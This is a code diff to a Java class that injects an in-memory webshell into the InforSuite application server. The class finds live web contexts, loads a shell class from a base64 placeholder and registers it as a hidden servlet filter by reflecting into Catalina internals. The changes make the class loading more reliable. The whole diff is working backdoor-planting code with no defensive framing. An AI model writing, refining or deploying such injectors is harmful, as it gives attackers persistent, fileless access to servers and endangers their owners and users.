@@ -44,6 +44,10 @@ public class InforSuiteFilterInjector {
         return "{{base64Str}}";
     }
 
+    /**
+     * com.cvicse.loong.enterprise.web.WebModule
+     * /usr/local/inforsuite/as/modules/web-glue.jar
+     */
     public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
         Set<Thread> threads = Thread.getAllStackTraces().keySet();
@@ -59,12 +63,18 @@ public class InforSuiteFilterInjector {
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            Object loader = invokeMethod(context, "getLoader", null, null);
+            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -83,8 +93,9 @@ public class InforSuiteFilterInjector {
             log.warning("filter already exists");
             return;
         }
-        Object filterDef = Class.forName("org.apache.catalina.deploy.FilterDef").newInstance();
-        Object filterMap = Class.forName("org.apache.catalina.deploy.FilterMap").newInstance();
+        ClassLoader contextClassLoader = context.getClass().getClassLoader();
+        Object filterDef = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterDef").newInstance();
+        Object filterMap = contextClassLoader.loadClass("org.apache.catalina.deploy.FilterMap").newInstance();
         invokeMethod(filterDef, "setFilterName", new Class[]{String.class}, new Object[]{filterName});
         invokeMethod(filterDef, "setFilterClass", new Class[]{Class.class}, new Object[]{filter.getClass()});
         invokeMethod(context, "addFilterDef", new Class[]{filterDef.getClass()}, new Object[]{filterDef});
@@ -97,7 +108,7 @@ public class InforSuiteFilterInjector {
             invokeMethod(context, "addFilterMap", new Class[]{filterMap.getClass()}, new Object[]{filterMap});
         }
 
-        Constructor<?>[] constructors = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
+        Constructor<?>[] constructors =contextClassLoader.loadClass("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
         constructors[0].setAccessible(true);
         Object filterConfig = constructors[0].newInstance(context, filterDef);
         HashMap<String, Object> filterConfigs = null;
